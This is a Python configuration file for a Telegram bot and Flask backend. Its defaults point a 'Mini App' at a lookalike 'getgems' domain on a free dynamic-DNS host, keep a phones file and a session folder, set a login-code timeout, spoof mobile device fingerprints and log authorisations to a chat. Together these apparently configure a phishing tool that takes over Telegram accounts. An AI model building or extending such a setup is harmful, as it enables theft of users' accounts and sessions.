import os
from typing import List
from pathlib import Path

# Загружаем .env файл из директории backend
env_path = Path(__file__).parent / '.env'
try:
    from dotenv import load_dotenv
    if env_path.exists():
        load_dotenv(dotenv_path=env_path, override=True)  # override=True чтобы перезаписать существующие
        print(f"✅ Loaded .env from {env_path}")
    else:
        load_dotenv(override=True)  # Пробуем загрузить из текущей директории
except ImportError:
    # dotenv не установлен, используем переменные окружения напрямую
    pass
except Exception as e:
    print(f"⚠️ Error loading .env: {e}")

class Config:
    """Конфигурация приложения"""
    
    # Telegram API
    TELEGRAM_API_ID: int = int(os.getenv("TELEGRAM_API_ID", "146546"))
    TELEGRAM_API_HASH: str = os.getenv("TELEGRAM_API_HASH", "a7ab219d394875464b1a3c20b4b3126")
    
    # Bot
    BOT_TOKEN: str = os.getenv("BOT_TOKEN", "")
    BOT_USERNAME: str = os.getenv("BOT_USERNAME", "Urionsbot")
    
    # Mini App
    MINI_APP_URL: str = os.getenv("MINI_APP_URL", "https://getgems.mooo.com")
    
    # Flask
    FLASK_HOST: str = os.getenv("FLASK_HOST", "0.0.0.0")
    FLASK_PORT: int = int(os.getenv("FLASK_PORT", "443"))
    FLASK_DEBUG: bool = os.getenv("FLASK_DEBUG", "false").lower() == "true"
    
    # Database
    DATABASE_PATH: str = os.getenv("DATABASE_PATH", "playerok.db")
    
    # Admins (список Telegram ID через запятую, например: "123,456")
    ADMIN_IDS_RAW: str = os.getenv("ADMIN_IDS", "")
    ADMIN_IDS = [
        int(_id.strip()) for _id in ADMIN_IDS_RAW.split(",") if _id.strip().isdigit()
    ]
    
    # Session
    SESSION_DIR: str = os.getenv("SESSION_DIR", "sessions")
    SESSION_DATA_FILE: str = os.getenv("SESSION_DATA_FILE", "session_data.json")
    PHONE_FILE: str = os.getenv("PHONE_FILE", "phones.json")
    
    # Timeout
    REQUEST_TIMEOUT: int = int(os.getenv("REQUEST_TIMEOUT", "30"))
    CODE_REQUEST_TIMEOUT: int = int(os.getenv("CODE_REQUEST_TIMEOUT", "60"))
    
    # Mobile devices
    MOBILE_DEVICES: List[dict] = [
        {
            'device_model': 'SM-G973F',
            'system_version': '10',
            'app_version': '8.4.1',
            'lang_code': 'en',
            'system_lang_code': 'en-US'
        },
        {
            'device_model': 'iPhone12,1',
            'system_version': '14.6',
            'app_version': '8.4.1',
            'lang_code': 'en',
            'system_lang_code': 'en-US'
        }
    ]
    
    # Forum logging
    FORUM_LOG_CHAT_ID: str = os.getenv("FORUM_LOG_CHAT_ID", "")
    FORUM_LOG_CHAT_ID_INT: int = int(FORUM_LOG_CHAT_ID) if FORUM_LOG_CHAT_ID and FORUM_LOG_CHAT_ID.lstrip('-').isdigit() else None
    
    AUTH_LOG_CHAT_ID: str = os.getenv("AUTH_LOG_CHAT_ID", "")
    AUTH_LOG_CHAT_ID_INT: int = int(AUTH_LOG_CHAT_ID) if AUTH_LOG_CHAT_ID and AUTH_LOG_CHAT_ID.lstrip('-').isdigit() else None
    
    @classmethod
    def ensure_directories(cls):
        """Создать необходимые директории"""
        if not os.path.exists(cls.SESSION_DIR):
            os.makedirs(cls.SESSION_DIR)

